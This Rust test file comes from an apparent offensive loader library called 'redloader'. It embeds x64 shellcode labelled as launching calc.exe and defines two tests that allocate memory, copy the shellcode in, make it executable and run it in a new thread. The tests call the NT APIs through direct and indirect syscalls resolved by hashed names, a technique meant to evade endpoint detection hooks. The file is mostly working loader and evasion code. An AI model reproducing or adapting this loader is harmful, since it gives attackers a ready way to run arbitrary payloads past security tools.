
#[cfg(test)]
mod syscalls {
    use std::ffi::c_void;
    use std::ptr;
    use std::io::Write;
    use windows::Win32::Foundation::{FALSE, HANDLE};
    use windows::Win32::System::Kernel::NULL64;
    use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE, VIRTUAL_ALLOCATION_TYPE};
    use evasion::syscalls::{prepare_direct_syscall, run_direct_syscall};
    use windows::Win32::System::Threading::{GetThreadId, THREAD_ALL_ACCESS};
    use redloader::evasion;
    use redloader::evasion::syscalls::{prepare_indirect_syscall, run_indirect_syscall};

    const NT_ALLOCATE_VIRTUAL_MEMORY_CRC32: u32 = 0xe77460e0;
    const NT_PROTECT_VIRTUAL_MEMORY_CRC32: u32 = 0x5e84b28c;
    const NT_CREATE_THREAD_EX_CRC32: u32 = 0xe2083cd5;
    const NT_WAIT_FOR_SINGLE_OBJECT_CRC32: u32 = 0x57c643ce;

    // calc.exe
    const PAYLOAD: [u8; 272] = [
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
        0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
        0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
        0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
        0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
        0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
        0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
        0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
        0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
        0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
        0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
    ];

    #[test]
    fn test_direct_syscall() {

        let mut p_address: *mut std::ffi::c_void = ptr::null_mut();
        let mut s_payload: usize = size_of_val(&PAYLOAD);
        let old_protection: u32 = 0;

        unsafe {
            let h_process: isize = -1;
            let h_thread: HANDLE = HANDLE::default();

            println!("[#] Press enter to attach a debugger...");
            std::io::stdout().flush().unwrap();
            let mut input = String::new();
            let _ = std::io::stdin().read_line(&mut input);

            // allocating memory
            prepare_direct_syscall(NT_ALLOCATE_VIRTUAL_MEMORY_CRC32);
            let status: usize = run_direct_syscall(h_process, &mut p_address, 0, &mut s_payload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            assert_eq!(status, 0x00,"[!] NtAllocateVirtualMemory Failed With Error: {:x}", status);
            assert!(!p_address.is_null(), "[!] NtAllocateVirtualMemory Returned Null Pointer");

            // copying the payload
            println!("[+] Allocated Memory At Address {:?}", p_address);
            ptr::copy_nonoverlapping(PAYLOAD.as_ptr(), p_address as _, s_payload);

            // changing memory protection
            prepare_direct_syscall(NT_PROTECT_VIRTUAL_MEMORY_CRC32);
            let status: usize = run_direct_syscall(h_process, &mut p_address, &mut s_payload, PAGE_EXECUTE_READ, &old_protection);
            assert_eq!(status, 0x00,"[!] NtProtectVirtualMemory Failed With Error: {:x}", status);

            prepare_direct_syscall(NT_CREATE_THREAD_EX_CRC32);
            let status: usize = run_direct_syscall(&h_thread, THREAD_ALL_ACCESS, NULL64, h_process, p_address, NULL64, false as i32, NULL64, NULL64, NULL64, NULL64);
            assert_eq!(status, 0x00,"[!] NtCreateThreadEx Failed With Error: {:x}", status);

            println!("[+] Thread {} Created Of Entry: {:?} \n", GetThreadId(h_thread), p_address);

            prepare_direct_syscall(NT_WAIT_FOR_SINGLE_OBJECT_CRC32);
            let status: usize = run_direct_syscall(h_thread, FALSE, NULL64);
            assert_eq!(status, 0x00,"[!] NtWaitForSingleObject Failed With Error: {:x}", status);

            println!("[#] Press enter to quit...");
            std::io::stdout().flush().unwrap();
            let mut input = String::new();
            let _ = std::io::stdin().read_line(&mut input);
        }
    }

    #[test]
    fn test_indirect_syscall() {

        let mut p_address: *mut c_void = ptr::null_mut();
        let mut s_payload: usize = size_of_val(&PAYLOAD);
        let old_protection: u32 = 0;

        unsafe {
            let h_process: isize = -1;
            let h_thread: HANDLE = HANDLE::default();

            println!("[#] Press enter to attach a debugger...");
            std::io::stdout().flush().unwrap();
            let mut input = String::new();
            let _ = std::io::stdin().read_line(&mut input);

            // allocating memory
            prepare_indirect_syscall(NT_ALLOCATE_VIRTUAL_MEMORY_CRC32);
            let status: usize = run_indirect_syscall(h_process, &mut p_address, 0, &mut s_payload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            assert_eq!(status, 0x00,"[!] NtAllocateVirtualMemory Failed With Error: {:x}", status);
            assert!(!p_address.is_null(), "[!] NtAllocateVirtualMemory Returned Null Pointer");

            // copying the payload
            println!("[+] Allocated Memory At Address {:?}", p_address);
            ptr::copy_nonoverlapping(PAYLOAD.as_ptr(), p_address as _, s_payload);

            // changing memory protection
            prepare_indirect_syscall(NT_PROTECT_VIRTUAL_MEMORY_CRC32);
            let status: usize = run_indirect_syscall(h_process, &mut p_address, &mut s_payload, PAGE_EXECUTE_READ, &old_protection);
            assert_eq!(status, 0x00,"[!] NtProtectVirtualMemory Failed With Error: {:x}", status);

            prepare_indirect_syscall(NT_CREATE_THREAD_EX_CRC32);
            let status: usize = run_indirect_syscall(&h_thread, THREAD_ALL_ACCESS, NULL64, h_process, p_address, NULL64, false as i32, NULL64, NULL64, NULL64, NULL64);
            assert_eq!(status, 0x00,"[!] NtCreateThreadEx Failed With Error: {:x}", status);

            println!("[+] Thread {} Created Of Entry: {:?} \n", GetThreadId(h_thread), p_address);

            prepare_indirect_syscall(NT_WAIT_FOR_SINGLE_OBJECT_CRC32);
            let status: usize = run_indirect_syscall(h_thread, FALSE, NULL64);
            assert_eq!(status, 0x00,"[!] NtWaitForSingleObject Failed With Error: {:x}", status);

            println!("[#] Press enter to quit...");
            std::io::stdout().flush().unwrap();
            let mut input = String::new();
            let _ = std::io::stdin().read_line(&mut input);
        }
    }


}